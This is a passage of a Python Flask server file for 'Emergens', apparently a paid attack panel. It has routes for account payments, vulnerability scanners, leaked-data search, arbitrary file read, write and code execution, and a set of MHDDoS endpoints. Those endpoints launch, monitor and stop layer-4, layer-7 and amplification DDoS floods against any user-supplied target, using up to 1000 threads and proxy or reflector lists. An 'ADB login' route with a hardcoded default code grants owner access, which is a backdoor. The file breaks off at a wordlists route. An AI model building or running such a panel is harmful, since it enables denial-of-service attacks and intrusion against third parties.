    if os.path.exists(PAYMENT_DATA_FILE):
        try:
            with open(PAYMENT_DATA_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return []


def _save_payments(p):
    try:
        with _payment_lock:
            with open(PAYMENT_DATA_FILE, "w") as f:
                json.dump(p, f, indent=2)
        return True
    except IOError:
        return False


payment_plans = _load_plans()


# ═══════════════════════════════════════════════════════════════════════════
# LOGIN RATE LIMIT
# ═══════════════════════════════════════════════════════════════════════════
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_SECONDS = 300
_failed_attempts: Dict[str, List[float]] = defaultdict(list)
_failed_lock = threading.Lock()


def _is_locked_out(ip):
    now = time.time()
    with _failed_lock:
        _failed_attempts[ip] = [t for t in _failed_attempts[ip]
                                 if now - t < LOCKOUT_SECONDS]
        return len(_failed_attempts[ip]) >= MAX_LOGIN_ATTEMPTS


def _record_failed(ip):
    with _failed_lock:
        _failed_attempts[ip].append(time.time())


# ═══════════════════════════════════════════════════════════════════════════
# AUTH
# ═══════════════════════════════════════════════════════════════════════════
def _extract_bearer():
    a = request.headers.get("Authorization", "")
    return a[7:] if a.startswith("Bearer ") else ""


def _authenticate_request():
    username = session.get("username")
    if username:
        role = get_role(username)
        if role is None:
            session.clear()
        else:
            session["role"] = role
            return True
    token = _extract_bearer()
    if token:
        username = token_store.validate_token(token)
        if username:
            role = get_role(username)
            if role is None:
                return False
            session["authenticated"] = True
            session["username"] = username
            session["role"] = role
            session.permanent = True
            return True
    return False


def login_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        if not _authenticate_request():
            if request.path.startswith("/api/"):
                return jsonify({"error": "unauthorized"}), 401
            return redirect(f"/login.html?next={request.path}")
        return f(*a, **kw)
    return wrapper


def api_login_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        if not _authenticate_request():
            return jsonify({"error": "unauthorized"}), 401
        return f(*a, **kw)
    return wrapper


def role_required(*roles):
    def deco(f):
        @wraps(f)
        def wrapper(*a, **kw):
            if not _authenticate_request():
                return jsonify({"error": "unauthorized"}), 401
            if session.get("role") not in roles:
                return jsonify({"error": "forbidden"}), 403
            return f(*a, **kw)
        return wrapper
    return deco


def current_user():
    username = session.get("username")
    if not username:
        return None
    role = get_role(username)
    return {"username": username, "role": role} if role else None


def owner_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        u = current_user()
        if not u:
            return jsonify({"error": "Not authenticated"}), 401
        if u.get("role") != "owner":
            return jsonify({"error": "Owner access required"}), 403
        return f(*a, **kw)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# HEALTH
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/health")
def api_health():
    return jsonify({"status": "ok", "time": _now_iso(),
                    "uptime_seconds": int(time.time() - SERVER_START_TIME)})


@app.route("/api/ready")
def api_ready():
    ready = {
        "scan_orchestrator": scan_orchestrator is not None,
        "http_logger": http_logger is not None,
        "xss": _xss_available, "sqli": _sqli_available,
        "sniper": _sniper_available, "takeover": _takeover_available,
        "dirfuzz": _dirfuzz_available,
    }
    return jsonify({"ready": all(ready.values()), "modules": ready}), \
           (200 if ready["scan_orchestrator"] else 503)


@app.route("/api/version")
def api_version():
    return jsonify({
        "app": "Emergens", "version": BANNER_VERSION,
        "python": sys.version.split()[0],
        "server_started": SERVER_START_TIME,
        "uptime_seconds": int(time.time() - SERVER_START_TIME),
        "modules": {
            "xss": _xss_available, "sqli": _sqli_available,
            "sniper": _sniper_available, "takeover": _takeover_available,
            "dirfuzz": _dirfuzz_available, "http_logger": _http_logger_available,
            "analytic": _analytic_available, "testing": _testing_available,
            "downsea": _downsea_available, "quick_menu": _quick_menu_available,
        },
    })


# ═══════════════════════════════════════════════════════════════════════════
# PAGE ROUTES
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("get-started.html")


@app.route("/get-started.html")
def get_started_page():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("get-started.html")


@app.route("/login.html")
def login_page():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("login.html")


@app.route("/dashboard.html")
@login_required
def dashboard_page():
    return render_template("dashboard.html",
                           username=session.get("username", DEFAULT_USERNAME),
                           role=session.get("role", "owner"))


@app.route("/payment.html")
def payment_page(): return render_template("payment.html")

@app.route("/management_payment.html")
@role_required("owner")
def management_payment_page(): return render_template("management_payment.html")

@app.route("/api_key_request_token.html")
def api_key_request_token_page(): return render_template("api_key_request_token.html")

@app.route("/api/api_key_request_token.html")
def api_key_request_token_api_page(): return render_template("api_key_request_token.html")

@app.route("/downloader_pinterest_tiktok.html")
@login_required
def downloader_pinterest_tiktok_page(): return render_template("downloader_pinterest_tiktok.html")

@app.route("/data_main.html")
@login_required
def data_main_redirect(): return redirect("/downloader_pinterest_tiktok.html")

@app.route("/code_test.html")
def code_test_page(): return render_template("code_test.html")

@app.route("/remote_access.html")
@login_required
def remote_access_page(): return render_template("remote_access.html")

@app.route("/emergens-control-m4ddos.html")
@login_required
def emergens_control_m4ddos_page(): return render_template("emergens-control-m4ddos.html")

@app.route("/MyEspT.html")
@login_required
def MyEspT_page(): return render_template("MyEspT.html")

@app.route("/quick_menu_setting.html")
@login_required
def quick_menu_setting_page(): return render_template("quick_menu_setting.html")

@app.route("/Emergens_osint.html")
@login_required
def emergens_osint_page(): return render_template("Emergens_osint.html")

@app.route("/structure_folder_file.html")
@login_required
def structure_folder_file_page(): return render_template("structure_folder_file.html")

@app.route("/password_lock.html")
def password_lock_page(): return render_template("password_lock.html")

@app.route("/Emergens_DB.html")
@login_required
def emergens_db_page(): return render_template("Emergens_DB.html")

@app.route("/docs.html")
@login_required
def docs_page(): return render_template("docs.html")

@app.route("/privacy.html")
def privacy_page(): return render_template("privacy.html")

@app.route("/terms.html")
def terms_page(): return render_template("terms.html")


# ═══════════════════════════════════════════════════════════════════════════
# STATIC
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/<path:filename>")
def serve_template_assets(filename):
    if not filename.endswith((".js", ".css")):
        return page_not_found(None)
    tdir = os.path.join(PROJECT_ROOT, "templates")
    safe = os.path.abspath(os.path.join(tdir, filename))
    if not safe.startswith(os.path.abspath(tdir)):
        return page_not_found(None)
    if os.path.isfile(safe):
        return send_from_directory(tdir, filename)
    return page_not_found(None)


# ═══════════════════════════════════════════════════════════════════════════
# PAYMENT API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/payment/plans")
def get_payment_plans():
    global payment_plans
    payment_plans = _load_plans()
    return jsonify({"plans": payment_plans})


@app.route("/api/payment/submit", methods=["POST"])
def submit_payment():
    d = _json_body()
    plan = (d.get("plan") or "").strip()
    amount = (d.get("amount") or "").strip()
    req_user = (d.get("requested_username") or "").strip()
    if not plan or not amount or not req_user:
        return jsonify({"error": "plan_amount_username_required"}), 400
    if plan not in _load_plans():
        return jsonify({"error": "invalid_plan"}), 400
    if user_store.user_exists(req_user):
        return jsonify({"error": "username_taken"}), 400
    pid = "PAY-" + uuid.uuid4().hex[:10].upper()
    rec = {
        "payment_id": pid, "user": session.get("username", "guest"),
        "requested_username": req_user, "plan": plan, "amount": amount,
        "payment_method": d.get("payment_method", "card"),
        "card_last4": d.get("card_number_last4", ""),
        "status": "pending", "created_at": _now_iso(), "updated_at": _now_iso(),
        "generated_username": None, "generated_password": None,
    }
    p = _load_payments(); p.append(rec); _save_payments(p)
    return jsonify({"payment_id": pid, "status": "pending"}), 201


@app.route("/api/payment/status/<payment_id>")
def get_payment_status(payment_id):
    for r in _load_payments():
        if r["payment_id"] == payment_id:
            if r["status"] == "approved" and r.get("generated_password"):
                return jsonify({k: r[k] for k in (
                    "payment_id", "status", "generated_username",
                    "generated_password", "plan", "amount")})
            return jsonify({"payment_id": r["payment_id"], "status": r["status"]})
    return jsonify({"error": "not_found"}), 404


@app.route("/api/payment/history")
def get_payment_history():
    user = session.get("username") if session.get("authenticated") else "guest"
    ps = [p for p in _load_payments() if p["user"] == user]
    for p in ps:
        if not (p["status"] == "approved" and p.get("generated_password")
                and (p["user"] == session.get("username")
                     or session.get("role") == "owner")):
            p.pop("generated_password", None)
            p.pop("generated_username", None)
    return jsonify({"payments": ps})


@app.route("/api/payment/manage/plans")
@role_required("owner")
def manage_get_plans():
    return jsonify({"plans": _load_plans()})


@app.route("/api/payment/manage/plans", methods=["POST"])
@role_required("owner")
def manage_update_plans():
    np = _json_body().get("plans")
    if not isinstance(np, dict):
        return jsonify({"error": "invalid"}), 400
    global payment_plans
    payment_plans = np
    return (jsonify({"success": True, "plans": np}) if _save_plans(np)
            else (jsonify({"error": "save_failed"}), 500))


@app.route("/api/payment/manage/pending")
@role_required("owner")
def manage_list_pending():
    return jsonify({"pending": [p for p in _load_payments()
                                if p["status"] == "pending"]})


@app.route("/api/payment/manage/all")
@role_required("owner")
def manage_list_all():
    return jsonify({"payments": _load_payments()})


@app.route("/api/payment/manage/approve/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_approve(payment_id):
    ps = _load_payments()
    for r in ps:
        if r["payment_id"] == payment_id:
            if r["status"] != "pending":
                return jsonify({"error": "already_processed"}), 400
            pw = uuid.uuid4().hex[:12]
            try:
                create_user(r["requested_username"], role="analyst", password=pw)
                r["generated_username"] = r["requested_username"]
                r["generated_password"] = pw
                r["status"] = "approved"
                r["updated_at"] = _now_iso()
                _save_payments(ps)
                return jsonify({"success": True,
                                "payment_id": r["payment_id"],
                                "generated_username": r["generated_username"],
                                "generated_password": pw,
                                "role": "analyst"})
            except Exception as e:
                return jsonify({"error": str(e)}), 500
    return jsonify({"error": "not_found"}), 404


@app.route("/api/payment/manage/reject/<payment_id>", methods=["POST"])
@role_required("owner")
def manage_reject(payment_id):
    ps = _load_payments()
    for r in ps:
        if r["payment_id"] == payment_id:
            if r["status"] != "pending":
                return jsonify({"error": "already_processed"}), 400
            r["status"] = "rejected"
            r["updated_at"] = _now_iso()
            _save_payments(ps)
            return jsonify({"success": True})
    return jsonify({"error": "not_found"}), 404


# ═══════════════════════════════════════════════════════════════════════════
# ADB LOGIN
# ═══════════════════════════════════════════════════════════════════════════
ADB_ACCESS_CODE = os.getenv("ADB_ACCESS_CODE", "ZYXN")
ADB_USERNAME = os.getenv("ADB_USERNAME", "Yanxzyx")


@app.route("/api/adb_login", methods=["POST"])
def api_adb_login():
    code = (_json_body().get("code") or "").strip().upper()
    if not code:
        return jsonify({"error": "code_required"}), 400
    if code != ADB_ACCESS_CODE:
        _record_failed(_client_ip())
        return jsonify({"error": "invalid_code"}), 401
    if not user_store.user_exists(ADB_USERNAME):
        try:
            create_user(ADB_USERNAME, role="owner",
                        password=secrets.token_urlsafe(12))
        except ValueError:
            pass
    session["authenticated"] = True
    session["username"] = ADB_USERNAME
    session["role"] = "owner"
    session.permanent = True
    return jsonify({"success": True, "username": ADB_USERNAME, "role": "owner"})


# ═══════════════════════════════════════════════════════════════════════════
# AUTH API
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/login", methods=["POST"])
def api_login():
    ip = _client_ip()
    if _is_locked_out(ip):
        return jsonify({"error": "too_many_attempts"}), 429
    d = _json_body()
    u = (d.get("username") or "").strip()
    if verify_credentials(u, d.get("password") or ""):
        session["authenticated"] = True
        session["username"] = u
        session["role"] = get_role(u)
        session.permanent = True
        return jsonify({"success": True})
    _record_failed(ip)
    return jsonify({"error": "invalid_credentials"}), 401


@app.route("/api/logout", methods=["POST"])
def api_logout():
    tok = _extract_bearer()
    if tok:
        token_store.revoke_token(tok[:8])
    session.clear()
    return jsonify({"success": True})


@app.route("/api/token", methods=["POST"])
def api_get_token():
    d = _json_body()
    u = (d.get("username") or d.get("address") or "").strip()
    p = d.get("password") or ""
    if not u or not p:
        return jsonify({"error": "username_and_password_required"}), 400
    tok = token_store.generate_token(u, p,
                                     user_agent=request.headers.get("User-Agent", ""))
    if tok is None:
        return jsonify({"error": "invalid_credentials"}), 401
    return jsonify({"token": tok, "token_prefix": tok[:8] + "****",
                    "expires_in": 3600, "username": u, "role": get_role(u)})


@app.route("/api/me")
@api_login_required
def api_me():
    return jsonify({"username": session.get("username"),
                    "role": session.get("role")})


# ═══════════════════════════════════════════════════════════════════════════
# REGISTER
# ═══════════════════════════════════════════════════════════════════════════
def _is_valid_email(email):
    return bool(re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", email)
                or re.match(r"^[a-zA-Z0-9._-]+@emergens\.id$", email))


@app.route("/api/register", methods=["POST"])
def api_register():
    d = _json_body()
    name = (d.get("name") or "").strip()
    email = (d.get("email") or "").strip().lower()
    username = (d.get("username") or "").strip()
    password = d.get("password") or ""
    if not (name and email and username and password):
        return jsonify({"error": "all_fields_required"}), 400
    if len(name) < 2:
        return jsonify({"error": "name_too_short"}), 400
    if not _is_valid_email(email):
        return jsonify({"error": "invalid_email"}), 400
    if len(username) < 3:
        return jsonify({"error": "username_too_short"}), 400
    if len(password) < 8:
        return jsonify({"error": "password_too_short"}), 400
    if user_store.user_exists(username):
        return jsonify({"error": "username_taken"}), 400
    try:
        create_user(username, role="analyst", password=password)
        return jsonify({"success": True, "username": username,
                        "role": "analyst", "email": email, "name": name})
    except Exception as e:
        return jsonify({"error": str(e)}), 400


# ═══════════════════════════════════════════════════════════════════════════
# SETTINGS / API KEYS
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/users")
@role_required("owner")
def api_list_users():
    return jsonify(list_users())


@app.route("/api/settings/create-account", methods=["POST"])
@role_required("owner")
def api_create_account():
    d = _json_body()
    username = (d.get("username") or "").strip()
    role = d.get("role") or ""
    if not username:
        return jsonify({"error": "username_required"}), 400
    if role not in VALID_ROLES:
        return jsonify({"error": "invalid_role"}), 400
    try:
        pw = create_user(username, role=role)
    except ValueError as e:
        return jsonify({"error": str(e)}), 400
    return jsonify({"username": username, "password": pw, "role": role})


@app.route("/api/settings/users/<username>", methods=["DELETE"])
@role_required("owner")
def api_delete_user(username):
    if username == session.get("username"):
        return jsonify({"error": "cannot_delete_self"}), 400
    ok, err = delete_user(username)
    if not ok:
        return jsonify({"error": err}), 400
    token_store.revoke_all_user_tokens(username)
    return jsonify({"success": True})


@app.route("/api/settings/api-keys")
@role_required("owner", "analyst")
def api_list_api_keys():
    return jsonify([_public_key_view(k) for k in user_store.get_api_keys()])


@app.route("/api/settings/api-keys", methods=["POST"])
@role_required("owner", "analyst")
def api_generate_api_key():
    if session.get("role") == "analyst" and len(user_store.get_api_keys()) >= 2:
        return jsonify({"error": "api_key_limit_reached", "limit": 2}), 403
    key = user_store.generate_api_key(session.get("username"))
    return jsonify({"key": key, "prefix": key[:20] + "****"})


@app.route("/api/settings/api-keys/<prefix>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_revoke_api_key(prefix):
    return (jsonify({"success": True}) if user_store.revoke_api_key(prefix)
            else (jsonify({"error": "not_found"}), 404))


# ═══════════════════════════════════════════════════════════════════════════
# SCAN / TOOLS
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/tools")
@api_login_required
def api_tools():
    return jsonify({n: i for n, i in scan_orchestrator.list_tools().items()
                    if "school" not in n.lower()})


@app.route("/api/scan/start", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_start():
    d = _json_body()
    target = (d.get("target") or "").strip()
    mode = d.get("mode", "basic")
    tools = d.get("tools", [])
    if not target:
        return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"):
        mode = "basic"
    return jsonify({"job_id": scan_orchestrator.start_scan(
        target, mode, tools, history_store)})


@app.route("/api/scan/<job_id>/status")
@api_login_required
def api_scan_status(job_id):
    p = scan_orchestrator.get_progress(job_id)
    return jsonify(p) if p else (jsonify({"error": "not_found"}), 404)


@app.route("/api/scan/<job_id>/cancel", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_cancel(job_id):
    return (jsonify({"success": True, "job_id": job_id})
            if scan_orchestrator.cancel_scan(job_id)
            else (jsonify({"error": "not_found"}), 404))


@app.route("/api/scan/<tool_name>", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_tool(tool_name):
    if tool_name not in TOOL_MAP:
        return jsonify({"error": "unknown_tool",
                        "available": list(TOOL_MAP.keys())}), 404
    d = _json_body()
    target = (d.get("target") or "").strip()
    mode = d.get("mode", "basic")
    if not target:
        return jsonify({"error": "target_required"}), 400
    try:
        return jsonify(TOOL_MAP[tool_name].run(
            target, mode if mode in ("basic", "expert") else "basic"))
    except Exception as e:
        return jsonify({"error": "tool_execution_failed", "detail": str(e)}), 500


@app.route("/api/scan/metrics")
@login_required
def api_scan_metrics():
    return jsonify(scan_orchestrator.metrics())


@app.route("/api/scan/jobs")
@login_required
def api_scan_jobs():
    st = request.args.get("status") or None
    try:
        limit = min(int(request.args.get("limit", 50)), 500)
    except (TypeError, ValueError):
        limit = 50
    return jsonify({"jobs": scan_orchestrator.list_jobs(status=st, limit=limit)})


@app.route("/api/scan/jobs/snapshot")
@login_required
def api_scan_snapshot():
    return jsonify(scan_orchestrator.snapshot())


@app.route("/api/scan/jobs/cancel-all", methods=["POST"])
@role_required("owner", "analyst")
def api_scan_cancel_all():
    return jsonify({"success": True, "cancelled": scan_orchestrator.cancel_all()})


# ═══════════════════════════════════════════════════════════════════════════
# UNIFIED JOB INTROSPECTION
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/jobs")
@login_required
def api_jobs_all():
    kind = request.args.get("kind") or None
    include = request.args.get("results", "0") == "1"
    jobs = sorted(job_manager.list_by_kind(kind),
                  key=lambda j: j.created, reverse=True)
    return jsonify({
        "jobs": [j.to_public(include_results=include) for j in jobs[:200]],
        "kinds": ["xss", "sqli", "sniper", "takeover", "dirfuzz"],
        "max_per_kind": job_manager.max_per_kind,
    })


@app.route("/api/jobs/<job_id>")
@login_required
def api_job_detail(job_id):
    job = job_manager.get(job_id)
    return (jsonify(job.to_public(include_results=True))
            if job else (jsonify({"error": "not_found"}), 404))


@app.route("/api/jobs/<job_id>/cancel", methods=["POST"])
@login_required
def api_job_cancel(job_id):
    return jsonify(job_manager.cancel(job_id))


@app.route("/api/jobs/cancel-all", methods=["POST"])
@login_required
def api_jobs_cancel_all():
    kind = request.args.get("kind") or None
    return jsonify({"success": True, "cancelled": job_manager.cancel_all(kind)})


# ═══════════════════════════════════════════════════════════════════════════
# LEAKDATA / HISTORY / SYSTEM / LOGS / SOURCE
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/leakdata/search", methods=["GET", "POST"])
@api_login_required
def api_leakdata_search():
    if request.method == "POST":
        d = _json_body()
        target = d.get("target") or d.get("query") or ""
    else:
        target = request.args.get("q", "")
    target = (target or "").strip()
    if not target:
        return jsonify({"error": "query_required"}), 400
    try:
        return jsonify(search_user_run(target))
    except Exception as e:
        return jsonify({"error": "search_failed", "detail": str(e)}), 500


@app.route("/api/history")
@api_login_required
def api_history():
    return jsonify(history_store.list_all())


@app.route("/api/history/<int:entry_id>")
@api_login_required
def api_history_detail(entry_id):
    entry = history_store.get(entry_id)
    return jsonify(entry) if entry else (jsonify({"error": "not_found"}), 404)


@app.route("/api/history/<int:entry_id>", methods=["DELETE"])
@role_required("owner", "analyst")
def api_history_delete(entry_id):
    history_store.delete(entry_id)
    return jsonify({"success": True})


@app.route("/api/system/stats")
@api_login_required
def api_system_stats():
    total_seen, last_min = _inbound_stats()
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
    except Exception:
        cpu = mem = disk = 0.0
    return jsonify({"cpu_percent": cpu, "memory_percent": mem,
                    "disk_percent": disk, "network_in": total_seen,
                    "network_in_rate": last_min,
                    "uptime_seconds": int(time.time() - SERVER_START_TIME)})


@app.route("/api/network/traffic")
@api_login_required
def api_network_traffic():
    total_seen, last_min = _inbound_stats()
    now = time.time()
    uptime = max(1.0, now - _net_traffic_started_at)
    prev_t = _prev_net["t"] or now
    dt = max(0.001, now - prev_t)
    delta = max(0, total_seen - _prev_net["total"])
    rps = delta / dt
    _prev_net["t"] = now
    _prev_net["total"] = total_seen
    try:
        net = psutil.net_io_counters()
        sent = net.bytes_sent; recv = net.bytes_recv
        pkts_s = net.packets_sent; pkts_r = net.packets_recv
    except Exception:
        sent = recv = pkts_s = pkts_r = 0
    return jsonify({
        "requests_total": total_seen, "requests_last_minute": last_min,
        "requests_per_second": round(rps, 2), "uptime_seconds": int(uptime),
        "bytes_sent": sent, "bytes_recv": recv,
        "packets_sent": pkts_s, "packets_recv": pkts_r,
        "network_in": total_seen, "network_in_rate": last_min,
        "inbound": last_min, "outbound": 0, "timestamp": _now_iso(),
    })


@app.route("/api/logs")
@api_login_required
def api_logs():
    n = int(request.args.get("lines", 100))
    try:
        with open(Config.SERVER_LOG_FILE) as f:
            content = f.readlines()[-n:]
        return jsonify({"lines": [c.rstrip("\n") for c in content]})
    except FileNotFoundError:
        return jsonify({"lines": []})


@app.route("/api/fetch-source", methods=["POST"])
@api_login_required
def api_fetch_source():
    d = _json_body()
    url = (d.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url_required"}), 400
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        r = fetch_source(url, extract=d.get("extract", False))
        return jsonify(r), (500 if "error" in r else 200)
    except Exception as e:
        return jsonify({"error": "fetch_failed", "detail": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# AI CHAT / SCHOOL / TELEGRAM
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/chat", methods=["POST"])
@role_required("owner", "analyst")
def api_chat():
    return jsonify(chat_handler.send(_json_body().get("message", "")))


@app.route("/api/chat/history")
@api_login_required
def api_chat_history():
    return jsonify(chat_handler.get_history())


@app.route("/api/chat/clear", methods=["POST"])
@role_required("owner", "analyst")
def api_chat_clear():
    chat_handler.clear_history()
    return jsonify({"success": True})


@app.route("/api/school/search")
@api_login_required
def api_school_search():
    try:
        from modules import scan_school
        return jsonify(scan_school.run(request.args.get("q", "").strip())["data"])
    except ImportError:
        return jsonify({"error": "school_module_unavailable"}), 503


@app.route("/api/telegram/status")
@api_login_required
def api_telegram_status():
    return jsonify(get_bot_status())


@app.route("/api/telegram/connect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_connect():
    d = _json_body()
    tok = (d.get("token") or "").strip()
    user = (d.get("username") or "").strip()
    if not tok or not user:
        return jsonify({"error": "token_and_username_required"}), 400
    ok, msg = connect_bot(tok, user, (d.get("owner_id") or "").strip(),
                          d.get("public_mode", True))
    return jsonify(get_bot_status()) if ok else (jsonify({"error": msg}), 500)


@app.route("/api/telegram/disconnect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_disconnect():
    disconnect_bot()
    return jsonify({"status": "disconnected"})


@app.route("/api/telegram/update-settings", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_update_settings():
    d = _json_body()
    s = {}
    if "owner_id" in d:
        s["owner_id"] = str(d["owner_id"]).strip()
    if "public_mode" in d:
        s["public_mode"] = bool(d["public_mode"])
    return (jsonify(update_bot_settings(**s)) if s
            else (jsonify({"error": "no_settings"}), 400))


@app.route("/api/telegram/broadcast", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_broadcast():
    msg = (_json_body().get("message") or "").strip()
    return (jsonify(broadcast_message(msg)) if msg
            else (jsonify({"error": "message_required"}), 400))


# ═══════════════════════════════════════════════════════════════════════════
# CODE TEST
# ═══════════════════════════════════════════════════════════════════════════
def _require_testing():
    return None if _testing_available else (jsonify({"error": "testing_unavailable"}), 503)


@app.route("/api/code_test/read")
@api_login_required
def api_code_test_read():
    g_ = _require_testing()
    if g_: return g_
    p = request.args.get("path", "").strip()
    return (jsonify(code_test_module.read_file(p)) if p
            else (jsonify({"error": "path_required"}), 400))


@app.route("/api/code_test/write", methods=["POST"])
@api_login_required
def api_code_test_write():
    g_ = _require_testing()
    if g_: return g_
    d = _json_body()
    fp = (d.get("file_path") or "").strip()
    return (jsonify(code_test_module.write_file(fp, d.get("content", "")))
            if fp else (jsonify({"error": "file_path_required"}), 400))


@app.route("/api/code_test/run", methods=["POST"])
@api_login_required
def api_code_test_run():
    g_ = _require_testing()
    if g_: return g_
    d = _json_body()
    if not d.get("code"):
        return jsonify({"error": "code_required"}), 400
    try:
        return jsonify({"results": code_test_module.run_tests(
            d["code"], d.get("test_cases", []))})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/code_test/files")
@api_login_required
def api_code_test_files():
    g_ = _require_testing()
    if g_: return g_
    return jsonify({"files": code_test_module.list_project_files()})


@app.route("/api/code_test/workspace_info")
@api_login_required
def api_code_test_ws():
    g_ = _require_testing()
    if g_: return g_
    return jsonify(code_test_module.get_workspace_info())


@app.route("/api/code_test/backup", methods=["POST"])
@api_login_required
def api_code_test_backup():
    g_ = _require_testing()
    if g_: return g_
    fp = _json_body().get("file_path")
    return (jsonify(code_test_module.backup_file(fp)) if fp
            else (jsonify({"error": "file_path_required"}), 400))


@app.route("/api/code_test/backup_all", methods=["POST"])
@api_login_required
def api_code_test_backup_all():
    g_ = _require_testing()
    if g_: return g_
    return jsonify(code_test_module.backup_all_source_files())


# ═══════════════════════════════════════════════════════════════════════════
# MHDDOS ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/mhddos/methods")
@login_required
def mhddos_methods():
    return jsonify({
        "available": True,
        "methods": sorted(_MHDDOS_METHODS),
        "layer7": sorted(_MHDDOS_LAYER7),
        "layer4": sorted(_MHDDOS_LAYER4),
        "amplification": sorted(_MHDDOS_AMP),
        "proxy_files": sorted(ALLOWED_PROXY_FILES),
        "reflector_files": sorted(ALLOWED_REFLECTOR_FILES),
    })


@app.route("/api/mhddos/start", methods=["POST"])
@login_required
def mhddos_start():
    d = _json_body()
    method = (d.get("method") or "").strip().upper()
    target = (d.get("target") or "").strip()
    try:
        threads = int(d.get("threads", 10))
        duration = int(d.get("duration", 60))
        proxy_type = int(d.get("proxy_type", 0))
        rpc = int(d.get("rpc", 1))
    except (TypeError, ValueError):
        return jsonify({"error": "invalid_numeric_parameter"}), 400
    if not method or not target:
        return jsonify({"error": "method_and_target_required"}), 400
    if method not in _MHDDOS_METHODS:
        return jsonify({"error": f"unknown_method: {method}"}), 400
    if not (1 <= threads <= 1000):
        return jsonify({"error": "threads_out_of_range"}), 400
    if not (1 <= duration <= 3600):
        return jsonify({"error": "duration_out_of_range"}), 400
    if proxy_type not in VALID_PROXY_TYPES:
        return jsonify({"error": "invalid_proxy_type"}), 400
    proxy_file = Path((d.get("proxy_file") or "proxies.txt").strip()).name
    reflector_file = Path((d.get("reflector_file") or "").strip()).name
    debug = bool(d.get("debug", False))
    if method in _MHDDOS_LAYER7:
        miss = [str(p) for p in REQUIRED_L7_FILES
                if not (Path(PROJECT_ROOT) / p).exists()]
        if miss:
            return jsonify({"error": "engine_missing_files",
                            "detail": ", ".join(miss)}), 500
    attack_id = "MHD-" + uuid.uuid4().hex[:8].upper()
    res = _mhddos_start_attack(attack_id, method, target, threads,
                                duration, proxy_type, proxy_file, rpc,
                                reflector_file, debug)
    return jsonify(res), (201 if res.get("success") else 500)


@app.route("/api/mhddos/stop", methods=["POST"])
@login_required
def mhddos_stop():
    aid = (_json_body().get("attack_id") or "").strip()
    if not aid:
        return jsonify({"error": "attack_id_required"}), 400
    res = _mhddos_stop_attack(aid)
    return jsonify(res), (200 if res.get("success") else 404)


@app.route("/api/mhddos/stop_all", methods=["POST"])
@login_required
def mhddos_stop_all():
    return jsonify(_mhddos_stop_all())


@app.route("/api/mhddos/status")
@login_required
def mhddos_status():
    aid = request.args.get("attack_id", "").strip()
    st = _mhddos_get_status(aid or None)
    if aid and st is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(st)


@app.route("/api/mhddos/history")
@login_required
def mhddos_history():
    try:
        limit = min(int(request.args.get("limit", 50)), 200)
    except (TypeError, ValueError):
        limit = 50
    with _mhddos_lock:
        snap = list(_mhddos_history[-limit:])
    return jsonify({"history": [_serialise_mhddos(h) for h in snap]})


@app.route("/api/mhddos/log/<attack_id>")
@login_required
def mhddos_log(attack_id):
    attack_id = attack_id.strip()
    if not re.match(r"^MHD-[A-Z0-9]{8}$", attack_id):
        return jsonify({"error": "invalid_attack_id"}), 400
    with _mhddos_lock:
        entry = _mhddos_processes.get(attack_id)
    log_path = (entry.get("log_path") if entry else None) or \
               (str(MHDDOS_LOG_DIR / f"{attack_id}.log")
                if (MHDDOS_LOG_DIR / f"{attack_id}.log").exists() else None)
    if not log_path or not Path(log_path).exists():
        return jsonify({"error": "log_not_found"}), 404
    try:
        n = min(int(request.args.get("lines", 200)), 2000)
    except (TypeError, ValueError):
        n = 200
    return jsonify({"attack_id": attack_id, "log_path": log_path,
                    "lines": _mhddos_read_log_tail(log_path, n).splitlines()})


@app.route("/api/mhddos/command", methods=["POST"])
@login_required
def mhddos_preview():
    d = _json_body()
    method = (d.get("method") or "").strip().upper()
    target = (d.get("target") or "").strip()
    if method not in _MHDDOS_METHODS or not target:
        return jsonify({"error": "valid_method_and_target_required"}), 400
    try:
        cmd = _mhddos_build_command(
            method, target, int(d.get("threads", 10)),
            int(d.get("duration", 60)), int(d.get("proxy_type", 0)),
            d.get("proxy_file") or "proxies.txt",
            int(d.get("rpc", 1)), bool(d.get("debug", False)),
            d.get("reflector_file") or "")
    except (TypeError, ValueError) as e:
        return jsonify({"error": f"invalid_parameter: {e}"}), 400
    return jsonify({
        "layer": "L7" if method in _MHDDOS_LAYER7 else "L4",
        "amplification": method in _MHDDOS_AMP,
        "argv": cmd, "argv_after_script": cmd[2:],
    })


# ═══════════════════════════════════════════════════════════════════════════
# WORDLISTS
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/exploit/wordlists")
